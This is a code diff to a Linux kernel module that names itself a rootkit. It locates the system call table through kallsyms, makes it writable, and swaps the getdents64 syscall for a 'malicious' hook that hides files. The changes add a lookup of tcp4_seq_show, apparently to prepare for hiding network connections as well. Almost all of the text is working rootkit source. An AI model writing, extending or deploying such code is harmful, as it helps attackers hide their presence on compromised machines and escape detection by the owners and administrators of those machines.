@@ -19,6 +19,9 @@ unsigned long *sys_call_table;
 asmlinkage int (*old_getdents64)(const struct pt_regs *regs);
 asmlinkage int new_getdents64(const struct pt_regs *regs);
 
+static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
+static int new_tcp4_seq_show(struct seq_file *seq, void *v);
+
 char* file_to_hide; 
 
 // parameters from command line
@@ -62,6 +65,8 @@ static int __init rootkit_enter(void) {
  kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;
  sys_call_table= (unsigned long*)kallsyms_lookup_name_("sys_call_table");
 
+ tcp4_seq_show = (void*)kallsyms_lookup_name_("tcp4_seq_show");
+ printk(KERN_INFO "found tcp4 function: %lx\n", tcp4_seq_show);
  printk(KERN_INFO "found sys_call_table address: %lx\n",sys_call_table);
 
  // save old getdents64 function
@@ -71,7 +76,9 @@ static int __init rootkit_enter(void) {
  set_addr_rw((unsigned long)sys_call_table);
  sys_call_table[__NR_getdents64] = new_getdents64;
  set_addr_ro((unsigned long)sys_call_table);
+
  printk(KERN_INFO "switched getdents64 syscall to malicious one");
+
  return 0;
 }
 
